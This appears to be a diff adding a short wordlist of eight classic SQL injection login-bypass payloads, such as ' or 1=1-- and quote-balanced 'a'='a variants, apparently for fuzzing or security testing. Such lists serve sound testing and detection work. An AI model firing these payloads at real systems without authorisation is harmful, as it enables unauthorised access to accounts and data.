@@ -1,0 +1,8 @@
+anything' OR 'x'='x
+' or 2=2--
+" or 1=1--
+or 1=1--
+' or 'a'='a
+" or "a"="a
+') or ('a'='a
+") or ("a"="a
